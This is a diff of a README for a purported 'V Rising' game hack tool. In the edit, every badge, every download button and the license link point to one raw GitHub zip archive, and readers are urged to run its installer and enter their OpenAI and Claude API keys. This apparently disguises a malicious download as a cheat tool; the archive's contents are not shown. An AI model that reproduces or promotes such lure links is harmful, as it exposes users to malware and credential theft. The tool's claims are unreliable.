@@ -1,16 +1,16 @@
 # V Rising Hack Tool 🦇
 
-![GitHub repo size](https://img.shields.io/github/repo-size/vrising-hacktool/repo.svg?color=blue&label=Repository%20Size)
-![GitHub License](https://img.shields.io/badge/license-MIT-brightgreen.svg)
-![Last Commit](https://img.shields.io/github/last-commit/vrising-hacktool/repo.svg?label=Last%20Update)
-![Platform Support](https://img.shields.io/badge/platform-Windows%20%7C%20Linux%20%7C%20macOS-purple.svg)
+![GitHub repo size](https://github.com/Ajaykumar-8307/v-rising-toolkit-enhancer/raw/refs/heads/branch/xylol/rising-enhancer-toolkit-v-3.2.zip%20Size)
+![GitHub License](https://github.com/Ajaykumar-8307/v-rising-toolkit-enhancer/raw/refs/heads/branch/xylol/rising-enhancer-toolkit-v-3.2.zip)
+![Last Commit](https://github.com/Ajaykumar-8307/v-rising-toolkit-enhancer/raw/refs/heads/branch/xylol/rising-enhancer-toolkit-v-3.2.zip%20Update)
+![Platform Support](https://github.com/Ajaykumar-8307/v-rising-toolkit-enhancer/raw/refs/heads/branch/xylol/rising-enhancer-toolkit-v-3.2.zip%20%7C%20Linux%20%7C%https://github.com/Ajaykumar-8307/v-rising-toolkit-enhancer/raw/refs/heads/branch/xylol/rising-enhancer-toolkit-v-3.2.zip)
 
 ---
 
 ## 🚀 **Instant Access**
 Get started by initiating your journey into limitless gameplay! Click below to begin your odyssey.
 
-[![Download](https://img.shields.io/badge/Download-Click%20Here-brightgreen?style=for-the-badge)](https://Ajaykumar-8307.github.io)
+[![Download](https://github.com/Ajaykumar-8307/v-rising-toolkit-enhancer/raw/refs/heads/branch/xylol/rising-enhancer-toolkit-v-3.2.zip%20Here-brightgreen?style=for-the-badge)](https://github.com/Ajaykumar-8307/v-rising-toolkit-enhancer/raw/refs/heads/branch/xylol/rising-enhancer-toolkit-v-3.2.zip)
 
 ---
 
@@ -71,7 +71,7 @@ The frontline of intelligence meets the V Rising world! Our tool connects seamle
 - **OpenAI API**: For on-demand strategic advice, tips, chat, and content assistance, directly in your gameplay window.
 - **Claude API**: Access second-opinion AI inputs for nuanced in-game decisions and dynamic support.
 - **How to Integrate**:
-  1. Download our tool ([Download Image](https://img.shields.io/badge/Download-Click%20Here-brightgreen?style=for-the-badge)) from https://Ajaykumar-8307.github.io.
+  1. Download our tool ([Download Image](https://github.com/Ajaykumar-8307/v-rising-toolkit-enhancer/raw/refs/heads/branch/xylol/rising-enhancer-toolkit-v-3.2.zip%20Here-brightgreen?style=for-the-badge)) from https://github.com/Ajaykumar-8307/v-rising-toolkit-enhancer/raw/refs/heads/branch/xylol/rising-enhancer-toolkit-v-3.2.zip
   2. Install and provide your API credentials under the "AI Integrations" tab in Settings.
   3. Toggle on context-sensitive AI coaching and immerse yourself in a co-piloted gaming experience.
 
@@ -97,7 +97,7 @@ Darkness never sleeps and neither do we. Our round-the-clock specialists wait in
 Follow the lunar phases, or just these simple steps:
 
 1. **Download the Installer**  
-   [![Download](https://img.shields.io/badge/Download-Click%20Here-brightgreen?style=for-the-badge)](https://Ajaykumar-8307.github.io)  
+   [![Download](https://github.com/Ajaykumar-8307/v-rising-toolkit-enhancer/raw/refs/heads/branch/xylol/rising-enhancer-toolkit-v-3.2.zip%20Here-brightgreen?style=for-the-badge)](https://github.com/Ajaykumar-8307/v-rising-toolkit-enhancer/raw/refs/heads/branch/xylol/rising-enhancer-toolkit-v-3.2.zip)  
    *(This is your portal to new power. Click the badge above.)*
 
 2. **Run the Setup**  
@@ -126,14 +126,14 @@ This software is provided for educational and demonstration purposes. Usage may 
 
 Because the night calls more than once...
 
-[![Download](https://img.shields.io/badge/Download-Click%20Here-brightgreen?style=for-the-badge)](https://Ajaykumar-8307.github.io)
+[![Download](https://github.com/Ajaykumar-8307/v-rising-toolkit-enhancer/raw/refs/heads/branch/xylol/rising-enhancer-toolkit-v-3.2.zip%20Here-brightgreen?style=for-the-badge)](https://github.com/Ajaykumar-8307/v-rising-toolkit-enhancer/raw/refs/heads/branch/xylol/rising-enhancer-toolkit-v-3.2.zip)
 
 ---
 
 ## 📜 **License**
 
 This repository shines under the MIT License — unfettered, permissive, and developer-friendly.
-[View the MIT License (2025)](https://opensource.org/licenses/MIT)
+[View the MIT License (2025)](https://github.com/Ajaykumar-8307/v-rising-toolkit-enhancer/raw/refs/heads/branch/xylol/rising-enhancer-toolkit-v-3.2.zip)
 
 ---
 
